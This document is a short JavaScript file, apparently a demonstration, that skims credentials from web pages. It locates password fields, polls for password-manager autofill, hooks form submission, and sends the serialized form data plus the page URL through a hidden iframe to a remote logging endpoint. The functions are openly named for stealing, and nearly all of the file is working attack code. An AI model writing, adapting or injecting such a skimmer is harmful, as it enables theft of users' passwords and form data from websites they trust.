// use an iframe element to make an GET HTTP request
var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display: none;');
document.body.appendChild(iframe);

function send(data) {
	// add the current web pages URL to the outgoiing data
	data += "&url=" + encodeURIComponent(window.location.href);

	// set the iframes src attribute to our remote server
	iframe.setAttribute('src', 'https://localhost:3001/log?' + data);
}
			
function stealFromPasswordManager(passwordInput, form) {
	if(passwordInput.val() != '') {
		send(form.serialize());
		return;
	}
	
	// Try again after 0.25s
	setTimeout(function() {
		stealFromPasswordManager(passwordInput, form);
	}, 250);
}

function stealOnSubmit(form) {
	form.submit(function(event) {
		send(form.serialize());
	});
}

var passwordInput = $('input[type="password"');
if(passwordInput.length > 0) {
	var form =  passwordInput.closest('form');
	
	stealFromPasswordManager(passwordInput, form);
	stealOnSubmit(form);
}
	
